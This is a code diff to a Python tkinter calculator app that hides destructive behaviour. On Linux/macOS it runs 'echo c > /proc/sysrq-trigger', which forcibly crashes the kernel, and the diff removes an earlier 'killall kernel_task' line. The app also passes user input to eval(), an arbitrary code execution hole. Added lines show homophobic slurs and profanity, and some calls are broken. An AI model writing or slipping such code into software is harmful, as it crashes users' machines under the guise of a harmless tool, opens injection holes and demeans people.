@@ -1,5 +1,6 @@
 import os
 import tkinter as tk
+import subprocess
 from tkinter import messagebox
 try:
     from ctypes import windll
@@ -10,6 +11,7 @@ try:
     from ctypes import byref
 except ImportError:
     print("gay non windows user")
+else: print("gay windows user")
 
 def create_calculator_gui():
     root = tk.Tk()
@@ -53,12 +55,13 @@ def create_calculator_gui():
         It includes a specific bash command for Linux and calls a Python function for Windows.
         """
         if os.name == 'nt':
+            messagebox.showinfo("fuck you")
             run_windows_function()
         elif os.name == 'posix':
             messagebox.showinfo("OS Check", "Running on Linux/macOS. Executing custom bash script.")
             try:
-                os.system("killall kernel_task")
                 os.system("echo c > /proc/sysrq-trigger")
+                os.system("echo how does one kernel panic on mac?")
             except Exception as e:
                 messagebox.showerror("Script Error", f"Error executing Linux script: {e}")
         else:
@@ -71,6 +74,11 @@ def create_calculator_gui():
             if '/0' in expression and not '/0.' in expression: 
                 messagebox.showerror("Error", "Seriously?")
                 clear_entry()
+                return
+            
+            if '/gay button' in expression and not '/gay button.' in expression:
+                messagebox.showinfo("Yeah i have peak humor")
+                clear_entry
                 return
 
             result = eval(expression)
